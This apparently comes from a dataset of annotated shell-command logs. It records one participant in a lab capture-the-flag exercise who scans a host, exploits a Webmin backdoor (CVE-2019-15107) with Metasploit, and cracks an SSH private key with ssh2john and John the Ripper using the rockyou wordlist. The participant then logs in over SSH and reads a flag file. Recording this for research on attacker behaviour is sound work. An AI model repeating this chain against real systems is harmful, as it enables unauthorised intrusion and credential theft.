@@ -1,0 +1,153 @@
+User 73 start time 1594797732 end 1594806064
+PADDING
+PADDING
+PADDING
+INPUT|73--0|M0 |1594797732|73|nmap -A 172.18.1.5|OUTPUT
+INPUT|73--1|U|1594798040|73|msf|OUTPUT
+INPUT|73--2|U|1594798048|73|metasploit|OUTPUT
+INPUT|73--3|M2 |1594798192|73|msfconsole|OUTPUT
+INPUT|73--4|M3 |1594798376|73|search webmin 1.920|OUTPUT
+INPUT|73--5|A3 |1594798437|73|search cve:2019-15107|OUTPUT
+INPUT|73--6|M8 |1594798455|73|use exploit/unix/webapp/webmin_backdoor|OUTPUT
+INPUT|73--7|M5 |1594798459|73|show options|OUTPUT
+INPUT|73--8|A6 |1594798512|73|set TARGETURI=172.18.1.5:10000|OUTPUT
+INPUT|73--9|A6 |1594798527|73|set TARGETURI 172.18.1.5:10000|OUTPUT
+INPUT|73--10|V8 |1594798583|73|run|OUTPUT
+INPUT|73--11|V5 |1594798606|73|show options|OUTPUT
+INPUT|73--12|A6 |1594798618|73|set TARGETURI /|OUTPUT
+INPUT|73--13|A6 |1594798627|73|set RHOST 172.18.1.5|OUTPUT
+INPUT|73--14|V8 |1594798631|73|run|OUTPUT
+INPUT|73--15|M6 |1594798677|73|set LHOST 0.0.0.0|OUTPUT
+INPUT|73--16|V8 |1594798683|73|run|OUTPUT
+INPUT|73--17|V5 |1594798744|73|show options|OUTPUT
+INPUT|73--18|A3 |1594798867|73|search edb:47230|OUTPUT
+INPUT|73--19|V3 |1594798877|73|search webmin|OUTPUT
+INPUT|73--20|U|1594798916|73|banner|OUTPUT
+INPUT|73--21|U|1594798923|73|info|OUTPUT
+INPUT|73--22|U|1594799037|73|connect|OUTPUT
+INPUT|73--23|V8 |1594799053|73|run|OUTPUT
+INPUT|73--24|V5 |1594799081|73|show options|OUTPUT
+INPUT|73--25|V6 |1594799177|73|set LHOST 10.1.135.83|OUTPUT
+INPUT|73--26|V8 |1594800875|73|run|OUTPUT
+INPUT|73--27|A10 |1594800923|73|ls|OUTPUT
+INPUT|73--28|U|1594800945|73|pwd|OUTPUT
+INPUT|73--29|A10 |1594800965|73|ls|OUTPUT
+INPUT|73--30|A10 |1594801047|73|ls|OUTPUT
+INPUT|73--31|A1 A9 A11 A12 A14 A16 A17 |1594801053|73|cat ssh2john.py|OUTPUT
+INPUT|73--32|M13 |1594801133|73|python ssh2john.py|OUTPUT
+INPUT|73--33|U|1594801313|73|connect|OUTPUT
+INPUT|73--34|U|1594801326|73|touch r.txt|OUTPUT
+INPUT|73--35|U|1594801354|73|cp /tmp.r.txt rsa_d|OUTPUT
+INPUT|73--36|A10 |1594801356|73|ls|OUTPUT
+INPUT|73--37|V13 |1594801367|73|python ssh2john.py rsa_d|OUTPUT
+INPUT|73--38|V13 |1594801401|73|python ssh2john.py rsa_d > john_rsa|OUTPUT
+INPUT|73--39|A14 |1594801408|73|john john_rsa|OUTPUT
+INPUT|73--40|A14 |1594801804|73|john rsa_d|OUTPUT
+INPUT|73--41|A14 |1594801811|73|john john_rsa|OUTPUT
+INPUT|73--42|V13 |1594802026|73|python ssh2john.py /tmp.k > rsa2|OUTPUT
+INPUT|73--43|A1 A9 A11 A12 A17 |1594802033|73|cat rsa_d|OUTPUT
+INPUT|73--44|A14 |1594802054|73|john ---h|OUTPUT
+INPUT|73--45|A14 |1594802061|73|john -h|OUTPUT
+INPUT|73--46|A10 |1594802084|73|ls|OUTPUT
+INPUT|73--47|A10 |1594802096|73|ls Documents/m|OUTPUT
+INPUT|73--48|A10 |1594802100|73|ls Documents/|OUTPUT
+INPUT|73--49|A10 |1594802105|73|ls Documents/ -laR|OUTPUT
+INPUT|73--50|A10 |1594802152|73|ls|OUTPUT
+INPUT|73--51|M14 |1594802196|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--52|A5 A14 |1594802212|73|john --show|OUTPUT
+INPUT|73--53|A10 |1594802216|73|ls|OUTPUT
+INPUT|73--54|A5 A14 |1594802230|73|john rsa_d --show|OUTPUT
+INPUT|73--55|A10 |1594802271|73|ls|OUTPUT
+INPUT|73--56|A10 |1594802280|73|ls fasttrack.txt|OUTPUT
+INPUT|73--57|A10 |1594802286|73|ls -l|OUTPUT
+INPUT|73--58|V14 |1594802311|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt.gz|OUTPUT
+INPUT|73--59|V14 |1594802320|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--60|U|1594802350|73|tar -xvf rockyou.txt.gz|OUTPUT
+INPUT|73--61|A9 A11 A12 A17 |1594802374|73|head rockyou.txt|OUTPUT
+INPUT|73--62|V14 |1594802434|73|john rsa2 --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--63|A10 |1594802480|73|ls|OUTPUT
+INPUT|73--64|A14 |1594802628|73|john john_rsa|OUTPUT
+INPUT|73--65|V14 |1594802653|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--66|V14 |1594802701|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--67|A14 |1594802785|73|john|OUTPUT
+INPUT|73--68|V14 |1594802792|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show|OUTPUT
+INPUT|73--69|V14 |1594802822|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show=left|OUTPUT
+INPUT|73--70|V14 |1594802830|73|john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show=right|OUTPUT
+INPUT|73--71|V14 |1594802859|73|john john_rsa --show --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--72|V14 |1594802932|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa|OUTPUT
+INPUT|73--73|V14 |1594802961|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --show|OUTPUT
+INPUT|73--74|V14 |1594802971|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa|OUTPUT
+INPUT|73--75|A9 A11 A12 A17 |1594803016|73|less rockyou.txt|OUTPUT
+INPUT|73--76|V14 |1594803106|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH|OUTPUT
+INPUT|73--77|A10 |1594803117|73|ls|OUTPUT
+INPUT|73--78|V14 |1594803137|73|john --wordlist /usr/share/wordlists/rockyou.txt rsa_d --format=SSH|OUTPUT
+INPUT|73--79|V14 |1594803150|73|john --wordlist /usr/share/wordlists/rockyou.txt rsa2 --format=SSH|OUTPUT
+INPUT|73--80|V14 |1594803210|73|john --wordlist /usr/share/wordlists/rockyou.txt rsa_d --format=SSH|OUTPUT
+INPUT|73--81|V14 |1594803217|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH|OUTPUT
+INPUT|73--82|A5 A14 |1594803230|73|john --show|OUTPUT
+INPUT|73--83|A5 A14 |1594803238|73|john --show john_rsa|OUTPUT
+INPUT|73--84|V13 |1594803295|73|python ssh2john.py r.txt > rsa3|OUTPUT
+INPUT|73--85|V14 |1594803375|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH --verbose|OUTPUT
+INPUT|73--86|A14 |1594803380|73|john|OUTPUT
+INPUT|73--87|V14 |1594803478|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH --verbose|OUTPUT
+INPUT|73--88|V14 |1594803484|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SS|OUTPUT
+INPUT|73--89|V14 |1594803488|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH|OUTPUT
+INPUT|73--90|V14 |1594803499|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH|OUTPUT
+INPUT|73--91|A9 A11 A12 A17 |1594803524|73|less rockyou.txt|OUTPUT
+INPUT|73--92|V14 |1594803790|73|john --wordlist /usr/share/wordlists/rockyou.txt john_rsa|OUTPUT
+INPUT|73--93|A5 |1594803802|73|show rsa_|OUTPUT
+INPUT|73--94|A5 |1594803806|73|show rsa_d|OUTPUT
+INPUT|73--95|A5 A14 |1594803815|73|john --show rsa_d|OUTPUT
+INPUT|73--96|V13 |1594803955|73|python ssh2john.py /tmp/id_rsa hash|OUTPUT
+INPUT|73--97|V13 |1594803965|73|python ssh2john.py /tmp/id_rsa > hash|OUTPUT
+INPUT|73--98|V14 |1594803982|73|john --wordlist /usr/share/wordlists/rockyou.txt hash|OUTPUT
+INPUT|73--99|V14 |1594804006|73|john --wordlist /usr/share/wordlists/rockyou.txt hash --rules|OUTPUT
+INPUT|73--100|A5 A14 |1594804025|73|john --show hash|OUTPUT
+INPUT|73--101|V14 |1594804115|73|john --wordlist /usr/share/wordlists/rockyou.txt hash --rules|OUTPUT
+INPUT|73--102|V14 |1594804133|73|john --wordlist=all.lst hash|OUTPUT
+INPUT|73--103|A14 |1594804195|73|sudo john|OUTPUT
+INPUT|73--104|A5 A14 |1594804217|73|john --show hash --format=SSH|OUTPUT
+INPUT|73--105|V14 |1594804224|73|john --wordlist /usr/share/wordlists/rockyou.txt hash --rules|OUTPUT
+INPUT|73--106|A5 A14 |1594804230|73|john --show hash --format=SSH|OUTPUT
+INPUT|73--107|V14 |1594804239|73|john --wordlist /usr/share/wordlists/rockyou.txt hash|OUTPUT
+INPUT|73--108|A5 A14 |1594804266|73|john --show hash --format=SSH|OUTPUT
+INPUT|73--109|V14 |1594804286|73|john --wordlist /usr/share/wordlists/rockyou.txt hash|OUTPUT
+INPUT|73--110|A10 |1594804339|73|ls|OUTPUT
+INPUT|73--111|U|1594804352|73|echo '!hellokitty!!' > wl.txt|OUTPUT
+INPUT|73--112|V14 |1594804372|73|john --wordlist wl.txt hash|OUTPUT
+INPUT|73--113|A10 |1594804383|73|ls|OUTPUT
+INPUT|73--114|A5 A14 |1594804396|73|john --show hash|OUTPUT
+INPUT|73--115|U|1594804508|73|echo -n '!hellokitty!!' > wl.txt|OUTPUT
+INPUT|73--116|V14 |1594804514|73|john --wordlist wl.txt hash|OUTPUT
+INPUT|73--117|A5 A14 |1594804527|73|john --show hash|OUTPUT
+INPUT|73--118|A5 A14 |1594804576|73|john --show --format=SSH                             hash|OUTPUT
+INPUT|73--119|M12 |1594804854|73|cat /tmp/id_rsa|OUTPUT
+INPUT|73--120|V13 |1594804898|73|python ssh2john.py /tmp/id_rsa|OUTPUT
+INPUT|73--121|A16 |1594805050|73|ssh-add /tmp/id_rsa|OUTPUT
+INPUT|73--122|A16 |1594805115|73|ssh-add id_rsa|OUTPUT
+INPUT|73--123|U|1594805128|73|la|OUTPUT
+INPUT|73--124|A10 |1594805132|73|ls -la|OUTPUT
+INPUT|73--125|V13 |1594805150|73|python ssh2john.py id_rsa > hash|OUTPUT
+INPUT|73--126|V14 |1594805167|73|john --wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
+INPUT|73--127|A5 A14 |1594805204|73|john --show id_rsa|OUTPUT
+INPUT|73--128|A5 A14 |1594805212|73|john --show hash|OUTPUT
+INPUT|73--129|V14 |1594805225|73|john --wordlist /usr/share/wordlists/rockyou.txt hash|OUTPUT
+INPUT|73--130|A5 A14 |1594805237|73|john --show hash|OUTPUT
+INPUT|73--131|V14 |1594805258|73|john --wordlist /usr/share/wordlists/rockyou.txt --fork 4 hash|OUTPUT
+INPUT|73--132|V14 |1594805279|73|john --wordlist /usr/share/wordlists/rockyou.txt --fork=4 hash|OUTPUT
+INPUT|73--133|V14 |1594805309|73|john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 hash|OUTPUT
+INPUT|73--134|A16 |1594805814|73|ssh-add id_rsa|OUTPUT
+INPUT|73--135|M16 |1594805833|73|ssh eve@10.1.17.4|OUTPUT
+INPUT|73--136|A16 |1594805923|73|cp id_rsa .ssh/id_rsa|OUTPUT
+INPUT|73--137|V16 |1594805926|73|ssh eve@10.1.17.4|OUTPUT
+INPUT|73--138|A10 |1594805937|73|ls|OUTPUT
+INPUT|73--139|A10 |1594805940|73|ls -a|OUTPUT
+INPUT|73--140|U|1594805961|73|chown 0044|OUTPUT
+INPUT|73--141|U|1594805967|73|chown 0044 id_rsa|OUTPUT
+INPUT|73--142|A16 |1594805973|73|ssh-add id_rsa|OUTPUT
+INPUT|73--143|V16 |1594805987|73|ssh eve@10.1.17.4|OUTPUT
+INPUT|73--144|A10 |1594806047|73|ls|OUTPUT
+INPUT|73--145|U|1594806052|73|cd top-secret/|OUTPUT
+INPUT|73--146|A10 |1594806054|73|ls|OUTPUT
+INPUT|73--147|A1 A9 A11 A12 A17 |1594806058|73|cat flag|OUTPUT
+INPUT|73--148|M17 |1594806064|73|cat flag.txt|OUTPUT
